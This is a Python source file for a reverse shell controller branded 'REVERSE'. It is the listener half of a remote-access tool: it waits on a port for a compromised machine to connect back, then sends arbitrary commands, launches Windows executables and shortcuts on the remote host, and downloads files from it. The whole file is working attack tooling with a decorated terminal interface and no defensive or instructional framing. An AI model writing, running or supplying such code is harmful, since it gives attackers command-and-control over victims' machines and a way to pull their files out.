import socket
import shutil
import os
import sys
import time
import platform

###########################################
# TERMINAL DISPLAY UTILITIES
###########################################

def clear_screen():
    """Clear the terminal screen with compatibility for different platforms."""
    if platform.system() == "Windows":
        os.system("cls")
    else:
        # More reliable clear for Unix systems
        print("\033c", end="")

def move_cursor(x, y):
    """Move cursor to specified position with fallback for terminals that don't support ANSI."""
    try:
        sys.stdout.write(f"\033[{y};{x}H")
        sys.stdout.flush()
    except:
        # Fallback if ANSI escape sequences fail
        pass

def print_inside(x, y, text):
    """Print text at specified position with error handling."""
    try:
        move_cursor(x, y)
        sys.stdout.write(text)
        sys.stdout.flush()
    except:
        # Fallback if positioning fails
        print(text)

def draw_box(x, y, width, height, title=""):
    """Draw a box with a title at the specified position."""
    # Using simpler box drawing characters for better terminal compatibility
    title_text = f"[ {title} ]"
    if len(title_text) >= width - 4:
        title_text = title_text[:width - 4]
    side_len = (width - 2 - len(title_text)) // 2
    extra = (width - 2 - len(title_text)) % 2
    
    # Simple ASCII box style
    top = "+" + "-" * side_len + title_text + "-" * (side_len + extra) + "+"
    print_inside(x, y, top)
    
    for i in range(1, height - 1):
        print_inside(x, y + i, "|" + " " * (width - 2) + "|")
    
    print_inside(x, y + height - 1, "+" + "-" * (width - 2) + "+")

def print_banner():
    """Print a stylish banner for the Reverse Shell tool."""
    clear_screen()
    
    # Get terminal dimensions
    cols, rows = shutil.get_terminal_size()
    
    # Define the banner
    banner = """
    ╔══════════════════════════════════════════════════════════════╗
    ║     █▄▄▄▄ ▄███▄      ▄   ▄███▄   █▄▄▄▄   ▄▄▄▄▄   ▄███▄       ║
    ║     █  ▄▀ █▀   ▀      █  █▀   ▀  █  ▄▀  █     ▀▄ █▀   ▀      ║
    ║     █▀▀▌  ██▄▄   █     █ ██▄▄    █▀▀▌ ▄  ▀▀▀▀▄   ██▄▄        ║
    ║     █  █  █▄   ▄▀ █    █ █▄   ▄▀ █  █  ▀▄▄▄▄▀    █▄   ▄▀     ║
    ║       █   ▀███▀    █  █  ▀███▀     █             ▀███▀       ║
    ║      ▀              █▐            ▀                          ║
    ║                     ▐                                        ║
    ╚══════════════════════════════════════════════════════════════╝
    """
    
    # Split the banner into lines
    banner_lines = banner.splitlines()
    banner_height = len(banner_lines)
    
    # Calculate vertical and horizontal centering
    vertical_padding = (rows - banner_height) // 2
    horizontal_padding = cols // 2
    
    # Print vertical padding (empty lines)
    print("\n" * vertical_padding, end="")
    
    # Center each line horizontally
    for line in banner_lines:
        print(line.center(cols))
    
    time.sleep(1.5)

def display_logo(x, y, box_width):
    """Display the REVERSE logo in the UI."""
    logo_lines = [
        "                                                             ",
        "    █▄▄▄▄ ▄███▄      ▄   ▄███▄   █▄▄▄▄   ▄▄▄▄▄   ▄███▄       ",
        "    █  ▄▀ █▀   ▀      █  █▀   ▀  █  ▄▀  █     ▀▄ █▀   ▀      ",
        "    █▀▀▌  ██▄▄   █     █ ██▄▄    █▀▀▌ ▄  ▀▀▀▀▄   ██▄▄        ",
        "    █  █  █▄   ▄▀ █    █ █▄   ▄▀ █  █  ▀▄▄▄▄▀    █▄   ▄▀     ",
        "      █   ▀███▀    █  █  ▀███▀     █             ▀███▀       ",
        "     ▀              █▐            ▀                          ",
        "                    ▐                                        ",
        "                                                             "  # Added an extra empty line
    ]

    # Center each line
    for i, line in enumerate(logo_lines):
        centered_x = (box_width - len(line)) // 2
        print_inside(centered_x, y + i, line)

###########################################
# USER INPUT HANDLING
###########################################

def get_port(x, y):
    """Get port number from user input with validation."""
    while True:
        try:
            # Clear previous input area
            print_inside(x, y, " " * 50)
            print_inside(x, y + 1, " " * 50)
            
            # Show input prompt
            print_inside(x, y, "Enter the port to listen on: ")
            
            # Move cursor to input position (after the colon and space)
            move_cursor(x + len("Enter the port to listen on: "), y)
            sys.stdout.flush()
            
            # Get port input
            port_input = input()
            
            # If input is empty, use a default port
            if not port_input.strip():
                return 4444  # Default port
            
            port = int(port_input.strip())
            if 1 <= port <= 65535:
                return port
            else:
                print_inside(x, y + 1, "[!] Invalid port. Must be 1–65535." + " " * 20)
                time.sleep(1.5)
        except KeyboardInterrupt:
            print_inside(x, y + 2, "[!] Port selection interrupted. Exiting." + " " * 20)
            exit(0)
        except Exception as e:
            print_inside(x, y + 1, f"[!] Invalid input: {str(e)[:30]}" + " " * 20)
            time.sleep(1.5)

def get_command(prompt_x, prompt_y, prompt_text):
    """Get command input from the user."""
    print_inside(prompt_x, prompt_y, prompt_text + " " * (shutil.get_terminal_size()[0] - len(prompt_text)))
    sys.stdout.flush()
    # Move cursor after the prompt text
    move_cursor(prompt_x + len(prompt_text), prompt_y)
    sys.stdout.flush()
    
    return input()

###########################################
# OUTPUT DISPLAY
###########################################

def display_paged_output(data, page_size=20):
    """
    Display long output in pages, allowing the user to scroll through it.
    :param data: List of strings (lines of output).
    :param page_size: Number of lines to display per page.
    """
    total_lines = len(data)
    current_line = 0

    while current_line < total_lines:
        # Display a page of output
        os.system("clear")  # Clear the screen for better readability
        print("\n".join(data[current_line:current_line + page_size]))

        # Check if there's more to display
        if current_line + page_size >= total_lines:
            print("\n[End of output. Press Enter to return.]")
            input()
            break
        else:
            print("\n[Press Enter to see more, or type 'q' to quit.]")
            user_input = input().strip().lower()
            if user_input == 'q':
                break

        # Move to the next page
        current_line += page_size

###########################################
# SHELL INTERFACE COMPONENTS
###########################################

class ShellInterface:
    def __init__(self):
        # Get terminal size
        self.cols, self.rows = shutil.get_terminal_size()
        
        # UI layout
        self.box_width = self.cols
        self.top_x = 0
        self.top_y = 3  # Increased to create more space for logo
        self.top_height = 5
        self.shell_y = self.top_y + self.top_height + 1
        self.shell_box_height = 10
        self.conn_status_y = self.shell_y - 1
        self.cmd_input_y = self.shell_y + self.shell_box_height + 1
        
        # Log storage
        self.log_lines = []
        self.max_log_lines = self.shell_box_height - 4
        
        # Status tracking
        self.status_text = ""
        
        # Set terminal title if possible
        if os.name == "posix":
            sys.stdout.write("\033]0;REVERSE: Reverse Shell Controller\007")
            sys.stdout.flush()

    def redraw_shell_box(self):
        """Redraw the shell interface with current log messages."""
        # 1) Clear the screen
        clear_screen()
        
        # 2) Display logo at the top with more space below it
        display_logo(self.top_x, 0, self.box_width)
        
        # Add an empty line after the logo for better separation
        print_inside(self.top_x, 8, " " * self.box_width)

        # 3) Print connection status if available
        if self.status_text:
            print_inside(self.top_x, self.conn_status_y, self.status_text.ljust(self.box_width))

        # 4) Recalculate dimensions
        self.shell_box_height = min(max(10, len(self.log_lines) + 4), self.rows - self.shell_y - 3)
        self.max_log_lines = self.shell_box_height - 4
        self.cmd_input_y = self.shell_y + self.shell_box_height + 1

        # 5) Clear console box area
        for y in range(self.shell_y, self.shell_y + self.shell_box_height + 5):
            print_inside(self.top_x, y, " " * self.box_width)

        # 6) Draw console box
        draw_box(self.top_x, self.shell_y, self.box_width, self.shell_box_height, "REVERSE SHELL CONSOLE")

        # 7) Fill with log lines
        display_lines = self.log_lines[-self.max_log_lines:] if self.log_lines else []
        wrapped = []
        for line in display_lines:
            while len(line) > self.box_width - 6:
                wrapped.append(line[:self.box_width - 6])
                line = line[self.box_width - 6:]
            wrapped.append(line)
        
        for i, line in enumerate(wrapped[-self.max_log_lines:]):
            pad = " " * (self.box_width - 6 - len(line))
            print_inside(self.top_x + 3, self.shell_y + 2 + i, line + pad)

    def add_log(self, message):
        """Add a message to the log and update the display."""
        if isinstance(message, str):
            self.log_lines.append(message)
        elif isinstance(message, list):
            self.log_lines.extend(message)
        self.redraw_shell_box()

    def set_status(self, status):
        """Update the status line."""
        self.status_text = status
        print_inside(self.top_x, self.conn_status_y, self.status_text.ljust(self.box_width))

    def setup_connection_ui(self, port):
        """Setup the UI for the connection phase."""
        draw_box(self.top_x, self.top_y, self.box_width, self.top_height, "REVERSE LINK ACTIVATOR")
        self.set_status(f"STATUS: Listening on 0.0.0.0:{port}...")
        self.add_log(f"[+] Listening on 0.0.0.0:{port}...")

###########################################
# NETWORKING FUNCTIONS
###########################################

def handle_file_download(conn, command, interface):
    """Handle file download from remote system."""
    filepath = command[len("download "):].strip().strip('"')
    conn.sendall(f"__download__::{filepath}\n".encode())

    # Receive header: OK or ERROR
    header = conn.recv(1024).decode(errors='ignore')
    if header.startswith("__error__::"):
        interface.add_log(f"[!] Download error: {header.split('::',1)[1]}")
        return
    elif not header.startswith("__begin_file__"):
        interface.add_log("[!] Unexpected response during download.")
        return

    # Prepare to save file
    save_name = os.path.basename(filepath)
    with open(save_name, "wb") as f:
        while True:
            chunk = conn.recv(4096)
            if b"__end_file__" in chunk:
                f.write(chunk.replace(b"__end_file__", b""))
                break
            f.write(chunk)
    interface.add_log(f"[+] File saved as: {save_name}")

def process_command(command, conn, addr, interface):
    """Process and send commands to the remote system."""
    # Handle special commands
    if command.strip().lower() == "exit":
        conn.sendall(b"exit\n")
        interface.add_log("[!] Session terminated.")
        return False
    
    if command.startswith("download "):
        handle_file_download(conn, command, interface)
        return True
    
    # Handle special execution commands for Windows
    if ".url" in command or ".lnk" in command:
        # For shortcut files, use the proper syntax
        clean_command = command.strip('"').strip("'")
        if not clean_command.startswith("cmd /c start"):
            command = f'cmd /c start "" "{clean_command}"'
        interface.add_log(f"[*] Launching shortcut: {clean_command}")
    elif any(ext in command.lower() for ext in [".exe", ".bat", ".cmd"]):
        # For executable files, use cmd /c start with empty title
        clean_command = command.strip('"').strip("'")
        if not clean_command.startswith("cmd /c start"):
            command = f'cmd /c start "" "{clean_command}"'
        interface.add_log(f"[*] Executing program: {clean_command}")
    
    # Log the command
    interface.add_log(f"$ {command}")
    
    # Send command
    conn.sendall((command + "\n").encode())
    
    # Show waiting message
    interface.set_status(f"STATUS: [*] Waiting for response from {addr[0]}...")
    
    # Collect response
    wait_start = time.time()
    data = b""
    while True:
        try:
            conn.settimeout(0.2)  # Short timeout for response
            chunk = conn.recv(4096)
            if not chunk:
                break
            data += chunk
        except socket.timeout:
            # Stop waiting if no data is received after a short timeout
            if len(data) > 0:
                break
            elif time.time() - wait_start > 10.0:  # 10-second timeout
                break
    
    # Process response
    output = data.decode(errors='ignore').strip()
    if output:
        interface.add_log(output.splitlines())
        # Display the output in a paged manner
        display_paged_output(output.splitlines())
    else:
        interface.add_log("[.] No output received.")
    
    # Reset status
    interface.set_status(f"CONNECTION FROM {addr[0]}:{addr[1]}")
    
    return True

def wait_for_connection(server_socket, interface):
    """Wait for a connection with animation."""
    wait_chars = ["-", "\\", "|", "/"]
    wait_idx = 0
    server_socket.settimeout(0.3)
    
    while True:
        try:
            # Show waiting animation
            print_inside(interface.top_x + len(interface.status_text) + 1, interface.conn_status_y, wait_chars[wait_idx])
            wait_idx = (wait_idx + 1) % len(wait_chars)
            
            # Check for connection
            conn, addr = server_socket.accept()
            # Reset socket timeout
            server_socket.settimeout(None)
            return conn, addr
        except socket.timeout:
            continue
        except KeyboardInterrupt:
            interface.add_log("[!] Listener canceled by user. Exiting.")
            interface.redraw_shell_box()
            return None, None

def handle_client_connection(conn, addr, interface):
    """Handle the connected client session."""
    conn_msg = f"CONNECTION FROM {addr[0]}:{addr[1]}"
    interface.set_status(conn_msg)
    interface.add_log(f"[+] Connection from {addr[0]}:{addr[1]}")
    
    try:
        # Try to get initial metadata from client
        conn.settimeout(2.0)
        try:
            metadata = conn.recv(2048).decode(errors='ignore').strip()
            if metadata:
                interface.add_log(f"[Client]: {metadata}")
        except:
            pass
        
        # Reset timeout
        conn.settimeout(None)
        
        # Main command loop
        running = True
        while running:
            try:
                # Get command from user
                command = get_command(interface.top_x, interface.cmd_input_y, "Shell> ")
                
                # Process the command
                running = process_command(command, conn, addr, interface)
                
            except KeyboardInterrupt:
                interface.add_log("[!] Session manually interrupted.")
                break
            except Exception as e:
                interface.add_log(f"[!] Error: {str(e)}")
                break
    
    except Exception as e:
        interface.add_log(f"[!] Connection error: {str(e)}")

###########################################
# MAIN FUNCTION
###########################################

def start_listener():
    """Main function to start the reverse shell listener."""
    clear_screen()
    
    # Initialize interface
    interface = ShellInterface()
    
    # Get port from user
    port = get_port(interface.top_x + 2, interface.top_y + 2)
    
    # Setup UI for connection phase
    interface.setup_connection_ui(port)
    
    try:
        # Setup socket
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server_socket.bind(("0.0.0.0", port))
        server_socket.listen(1)
        
        # Wait for connection
        conn, addr = wait_for_connection(server_socket, interface)
        if conn and addr:
            # Handle client connection
            with conn:
                handle_client_connection(conn, addr, interface)
    
    except Exception as e:
        interface.set_status(f"ERROR: {str(e)}")
    
    finally:
        # Clean exit message
        print_inside(interface.top_x, interface.cmd_input_y + 2, "Press Enter to exit...")
        input()

###########################################
# PROGRAM ENTRY POINT
###########################################

if __name__ == "__main__":
    try:
        print_banner()
        start_listener()
    except KeyboardInterrupt:
        clear_screen()
        print("\nExiting Reverse Shell Controller...")
        time.sleep(0.5)
    except Exception as e:
        print(f"\nAn error occurred: {str(e)}")
        print("Press Enter to exit...")
        input()